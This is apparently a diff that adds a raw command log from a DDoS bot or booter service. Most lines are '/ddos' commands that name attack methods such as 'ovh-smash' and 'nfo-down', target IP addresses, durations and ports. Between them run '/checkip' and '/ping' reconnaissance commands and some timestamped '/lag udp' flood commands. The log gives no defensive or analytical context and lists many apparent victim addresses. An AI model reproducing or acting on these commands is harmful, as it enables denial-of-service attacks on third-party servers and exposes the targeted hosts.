@@ -1,0 +1,139 @@
+/ddos std 3.83.161.184 60 9006
+/ddos std 109.23.221.21 120 80
+/checkip 54.39.131.174
+/checkip 54.39.131.174
+/checkip 73.150.241.250
+/checkip 104.153.108.102
+/methods
+/checkip 51.222.33.53
+/ping 167.114.178.140
+/checkip 167.114.178.140
+/check ip 8.20.122.91
+/ping 8.20.122.91
+/checkip 8.20.122.91
+/checkip 162.248.88.18
+/ping 162.248.88.18
+/checkip 167.114.178.140
+/checkip 158.69.210.226
+/checkip 59.39.131.174
+/checkip 54.39.131.174
+/checkip 167.114.104.0
+/checkip  73.129.192.142
+/ping  73.129.192.142
+/checkip 104.153.108.102
+/plan
+/ping 104.153.108.102
+/checkip 35.164.74.41
+/checkip 54.39.131.174
+/ping 54.39.131.174
+/ping 54.39.131.174
+/ping 54.39.131.174
+/ping 54.39.131.174
+/ping 54.39.131.174
+/methods
+/ddos ovh-smash 54.39.131.174 120 22
+/ddos ovh-smash 54.39.131.174 120 22
+/ddos ovh-smash 54.39.131.174 120 22
+/checkip 68.235.43.102
+/ping 68.235.43.102
+/checkip 18.236.145.153
+/checkip 51.222.33.61
+/checkip 52.37.40.144
+/checkip 100.24.28.142
+/checkip 216.49.154.218
+/ping 216.49.154.218
+/checkip 97.82.61.190
+/methods
+/ddos std 216.49.154.218 120 80
+/checkip 54.245.135.250
+/checkip 24.214.138.115
+/checkip 34.221.22.243
+/checkip  69.136.134.204
+/methods
+/ddos std 69.136.134.204 60 80
+/ping 69.136.134.204
+/checkip 51.83.180.150
+/ping 69.136.134.204
+/ping 51.83.180.150
+/ddos ovh-smash 51.83.180.150 60 52828
+/ping 51.83.180.150
+/checkip 51.83.180.150
+/checkip 18.237.236.204
+/checkip 24.194.113.108
+/checkip 54.39.131.174
+/checkip 54.39.131.174
+/checkip 54.39.131.174
+/ping 54.39.131.174
+/checkip 86.177.254.29
+/methods
+/ddos std 86.177.254.29 60 80
+/checkip 51.222.48.81
+/methods
+/ddos ovh-smash 51.222.48.81 100 49
+/ping 51.222.48.81
+/checkip 174.110.201.100
+/checkip 107.242.116.38
+/checkip 142.44.223.234
+/ping 142.44.223.234
+/checkip 69.200.249.193
+/ping  69.200.249.193
+/ping 142.44.223.234
+/ddos ovh-smash 142.44.223.234 60 37
+/checkip  104.140.242.140
+/ping  104.140.242.140
+/methods
+/ddos tcp  104.140.242.140 60 22
+/ping  104.140.242.140
+/stop
+/lag
+/checkip 51.195.155.222
+/checkip 144.217.155.85
+/ping 144.217.155.85
+/ddos ovh-smash 144.217.155.85 120 443
+/ping 144.217.155.85
+/ping 144.217.155.85
+/ping 144.217.155.85
+/ping 144.217.155.85
+/ping 201.226.176.204
+/checkip 51.81.34.229
+/ping 51.81.34.229
+/methods
+/checkip
+/checkip v
+/checkip 192.223.30.35
+/methods
+/ddos nfo-down 192.223.30.35 120 22
+/checkip 51.89.19.245
+/ping
+/methods
+/ddos ovh-smash 51.89.19.245 120 22
+/ping 94.154.159.137
+/check up
+/ping 149.56.114.180
+/checkip 149.56.114.180
+/methods
+/ddos ovh-smash 149.56.114.180 120 59337
+/ping 99.37.170.210
+/ping 51.89.19.245
+/ddos ovh-smash 144.217.234.243 120 22
+/ping 144.217.234.243
+/ping 144.217.234.243
+/methods
+/methods
+/ddos nfo-down 74.91.124.123 120  911
+/ping 74.91.124.123
+/checkip 192.168.0.153
+/checkip 74.201.102.95
+/checkip  70.42.198.36
+/checkip 52.40.157.240
+/checkip 73.86.93.66
+/checkip 69.47.131.242
+/methods
+/stdhex 3.17.9.211 60 9086
+/ddos std 3.17.9.211 60 9086
+/checkip 51.222.33.60
+/checkip 73.107.8.222
+[Sun Aug 02 2020 13:27:52 GMT-1100 (Samoa Standard Time)] /spotify
+[Wed Aug 05 2020 23:10:21 GMT-1100 (Samoa Standard Time)] /lag
+[Wed Aug 05 2020 23:11:30 GMT-1100 (Samoa Standard Time)] /lag udp 74.74.74.73 10 60 100 80
+[Wed Aug 05 2020 23:12:16 GMT-1100 (Samoa Standard Time)] /lag udp squid net bot 100 65000 100 65000
